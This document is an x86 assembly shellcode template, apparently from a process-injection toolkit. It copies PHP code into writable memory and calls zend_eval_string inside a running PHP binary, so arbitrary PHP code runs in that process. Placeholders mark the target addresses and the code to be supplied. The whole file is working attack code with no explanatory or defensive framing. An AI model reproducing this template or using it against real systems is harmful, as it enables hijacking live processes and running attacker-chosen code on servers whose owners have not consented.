jmp execute_php_code_main


execute_php_code_main:

	// copy the PHP name and code string to arbitrary read/write memory
	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	# set ESI to the address of the PHP name string
	call execute_php_code_phpname_get_next
execute_php_code_phpname_get_next:
	pop esi
	add esi, 6
	jmp execute_php_code_copy_phpname

php_name:
	.ascii "[VARIABLE:phpname:VARIABLE]\0"

execute_php_code_copy_phpname:
	mov ecx, [VARIABLE:phpname.length:VARIABLE]
	add ecx, 2												# null terminator
	rep movsb
	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	add edi, 128
	# set ESI to the address of the PHP code string
	call execute_php_code_phpcode_get_next
execute_php_code_phpcode_get_next:
	pop esi
	add esi, 6
	jmp execute_php_code_copy_phpcode

php_code:
	.ascii "[VARIABLE:phpcode:VARIABLE]\0"

execute_php_code_copy_phpcode:
	push ecx
	mov ecx, [VARIABLE:phpcode.length:VARIABLE]
	add ecx, 2												# null terminator
	rep movsb
	pop ecx
	// END: copy the PHP name and code string to arbitrary read/write memory
	
	// BEGIN: call zend_eval_string("arbitrary PHP code here")
	push edx
	push ecx
	push ebx
	push eax
	
	sub esp, 0x4
	// arbitrary name
	mov eax, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	push eax
	push 0x0
	// # PHP code
	mov eax, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	add eax, 128
	push eax
	mov edx, [SYMBOL_ADDRESS:^zend_eval_string$:IN_BINARY:.+/php($|[0-9\.]+$):SYMBOL_ADDRESS]
	call edx

	add esp, 0x10
	pop eax
	pop ebx
	pop ecx
	pop edx
	// END: call zend_eval_string("arbitrary PHP code here")

SHELLCODE_SECTION_DELIMITER
	




